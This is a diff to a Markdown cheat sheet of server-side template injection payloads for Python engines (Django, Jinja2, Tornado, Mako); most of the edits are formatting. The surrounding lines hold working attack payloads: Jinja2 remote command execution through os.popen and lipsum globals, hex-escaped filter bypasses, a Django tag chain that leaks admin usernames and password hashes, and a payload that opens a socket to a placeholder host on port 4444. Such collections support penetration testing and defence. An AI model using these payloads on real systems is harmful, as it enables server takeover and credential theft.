@@ -2,7 +2,6 @@
 
 > Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server. In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is included in templates without proper sanitization.
 
-
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
@@ -30,11 +29,10 @@
     - [Jinja2 - Filter Bypass](#jinja2---filter-bypass)
 - [Tornado](#tornado)
     - [Tornado - Basic Injection](#tornado---basic-injection)
-    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)    
+    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)
 - [Mako](#mako)
     - [Mako - Remote Command Execution](#mako---remote-command-execution)
 - [References](#references)
-
 
 ## Templating Libraries
 
@@ -49,7 +47,6 @@
 | Pystache  | `{{ }}`  |
 | Tornado   | `{{ }}`  |
 
-
 ## Django
 
 Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.
@@ -61,7 +58,6 @@ Django template language supports 2 rendering engines by default: Django Templat
 {{ 7*7 }}  # Error with Django Templates
 ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 ```
-
 
 ### Django - Cross-Site Scripting
 
@@ -84,17 +80,17 @@ ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 
 ### Django - Admin Site URL leak
 
-
-```
+```python
 {% include 'admin/base.html' %}
 ```
 
 ### Django - Admin Username And Password Hash Leak
 
-
-```
+```ps1
 {% load log %}{% get_admin_log 10 as log %}{% for e in log %}
 {{e.user.get_username}} : {{e.user.password}}{% endfor %}
+
+{% get_admin_log 10 as admin_log for_user user %}
 ```
 
 ---
@@ -137,7 +133,7 @@ If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump
 <pre>{% debug %}</pre>
 ```
 
-Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
+Source: <https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement>
 
 ### Jinja2 - Dump All Used Classes
 
@@ -202,7 +198,6 @@ def hook(*args, **kwargs):
 }}
 ```
 
-
 #### Exploit The SSTI By Calling os.popen().read()
 
 ```python
@@ -225,7 +220,7 @@ We can use these shorter payloads:
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
-Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+Source [@podalirius_](https://twitter.com/podalirius_) : <https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/>
 
 With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
 
@@ -233,7 +228,7 @@ With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a pa
 {{ lipsum.__globals__["os"].popen('id').read() }}
 ```
 
-Source: https://twitter.com/podalirius_/status/1655970628648697860
+Source: <https://twitter.com/podalirius_/status/1655970628648697860>
 
 #### Exploit The SSTI By Calling subprocess.Popen
 
@@ -250,7 +245,7 @@ Source: https://twitter.com/podalirius_/status/1655970628648697860
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
+Simply modification of payload to clean up output and facilitate command input (<https://twitter.com/SecGus/status/1198976764351066113>)
 In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
 
 ```python
@@ -303,13 +298,13 @@ Bypassing `|join`
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 
-Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by <https://twitter.com/SecGus>:
+
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
 ---
-
 
 ## Tornado
 
@@ -329,14 +324,10 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 ---
 
-
 ## Mako
 
 [Official website](https://www.makotemplates.org/)
 > Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
-
-
-
 
 ```python
 <%
@@ -413,7 +404,6 @@ PoC :
 >>> print(Template("${self.module.cache.util.os}").render())
 <module 'os' from '/usr/local/lib/python3.10/os.py'>
 ```
-
 
 ## References
 
